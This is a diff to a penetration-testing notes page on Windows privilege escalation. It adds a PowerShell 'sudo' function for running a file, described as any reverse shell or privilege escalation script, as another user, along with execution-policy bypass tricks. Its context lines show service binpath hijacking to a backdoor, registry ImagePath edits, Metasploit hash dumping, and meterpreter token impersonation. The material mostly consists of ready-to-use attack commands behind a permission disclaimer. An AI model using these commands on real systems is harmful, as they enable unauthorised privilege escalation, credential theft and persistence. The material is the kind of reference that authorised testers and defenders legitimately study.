@@ -6,9 +6,9 @@ Hack Responsibly.
 Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
 {% endhint %}
 
-## Privilege Escalation
 
-### Script Execution Policy Bypass Methods
+
+## PowerShell Script Execution Policy Bypass Methods
 
 <table>
   <thead>
@@ -114,7 +114,7 @@ Invoke-Command -ComputerName $computer -FilePath .'\$module.ps1m' -Credential (G
 
 This will execute the file and it's contents on the remote computer.
 
-Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.
+Another sneaky method would be to have the script load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.
 
 ```text
 Write-Verbose "Creates powershell profile for user"
@@ -132,6 +132,44 @@ powershell.exe
 # If that does not work try reloading the user profile.
 & $PROFILE
 ```
+
+### Run script code as a function
+
+Running the code from your PowerShell script inside a function will completely bypass script execution policies.  Other code protection policies such as JEA may still stop certain cmdlets and code from running, however.
+
+```text
+function $function_name {
+
+#code goes here
+
+}
+```
+
+Then you can re-use the code by just typing the function name.
+
+## Powershell Sudo for Windows
+
+\#TODO:make it so this will take arguments, so can use like `sudo -User bob test.bat`
+
+There may be times when you know the credentials for another user, but can't spawn other windows. The `sudo` equivalent in PowerShell on Windows machines is the verb `RunAs`.  It is not as simple to use as `sudo`, however.  Below is a PowerShell script that that will run a separate file as another user. You can then run a batch file, PowerShell script, or just execute a meterpreter binary as that user. The below function is to be run from a PowerShell prompt:
+
+```text
+function sudo {
+
+$pw = ConvertTo-SecureString "$Password" -AsPlainText -Force
+$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$DomainName\$UserName",$pw
+
+#The script below can be any privilege escalation or reverse shell script or executable
+#make it so this will take an argument, so can use like "sudo -User bob test.bat"
+$script = "C:\Users\$UserName\AppData\Local\Temp\test.bat"
+
+Start-Process powershell -Credential $cred -ArgumentList '-NoProfile -Command &{Start-Process $script -verb RunAs}'
+}
+
+sudo
+```
+
+Running this in a function will bypass Script Execution policies, though JEA may still give you trouble.
 
 ## Services
 
@@ -151,11 +189,11 @@ sc config <service_name> binpath= "C:\path\to\backdoor.exe"
 
 Other Permissions can be used to escalate privileges: 
 
-* SERVICE\_CHANGE\_CONFIG Can reconfigure the service binary 
-* WRITE\_DAC: Can reconfigure permissions, leading to SERVICE\_CHANGE\_CONFIG 
-* WRITE\_OWNER: Can become owner, reconfigure permissions 
-* GENERIC\_WRITE: Inherits SERVICE\_CHANGE\_CONFIG 
-* GENERIC\_ALL: Inherits SERVICE\_CHANGE\_CONFIG \(To detect and exploit this vulnerability you can use exploit/windows/local/service\_permissions in MetaSploit\)
+* `SERVICE_CHANGE_CONFIG`: Can reconfigure the service binary 
+* `WRITE_DAC`: Can reconfigure permissions, leading to `SERVICE_CHANGE_CONFIG`
+* `WRITE_OWNER`: Can become owner, reconfigure permissions 
+* `GENERIC_WRITE`: Inherits `SERVICE_CHANGE_CONFIG`
+* `GENERIC_ALL`: Inherits `SERVICE_CHANGE_CONFIG`\(To detect and exploit this vulnerability you can use `exploit/windows/local/service_permissions` in MetaSploit\)
 
 Check if you can modify the binary that is executed by a service. You can retrieve a list of every binary that is executed by a service using `wmic` \(not in system32\) and check your permissions using `icacls`:
 
@@ -186,7 +224,7 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
 
-Check if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl. In that case you can change the binary that is going to be executed by the service. To change the Path of the binary executed: `reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f`
+Check if Authenticated Users or NT AUTHORITY\INTERACTIVE have `FullControl`. In that case you can change the binary that is going to be executed by the service. To change the Path of the binary executed: `reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f`
 
 ### Unquoted Service Paths \(TODO: _link to persistence pages_\)
 
@@ -225,19 +263,19 @@ You can detect and exploit this vulnerability with metasploit using the module: 
 
 ### Misc
 
-\[&gt;\] List the domain administrators:
+List domain administrators:
 
 ```text
 net group "Domain Admins" /domain
 ```
 
-\[&gt;\] Dump the hashes \(Metasploit\)
+Dump password hashes \(Metasploit\)
 
 ```text
 msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
 ```
 
-\[&gt;\] Find the admins \(Metasploit\)
+Find admin users \(Metasploit\)
 
 ```text
 spool /tmp/enumdomainusers.txt
@@ -250,7 +288,7 @@ msf > run
 msf> spool off
 ```
 
-\[&gt;\] If Compromised Admin's box
+Impersonate an administrator
 
 ```text
 meterpreter > load incognito
@@ -260,7 +298,7 @@ meterpreter > getuid
 meterpreter > shell
 ```
 
-\[&gt;\] Other
+Add a user
 
 ```text
 C:\> whoami
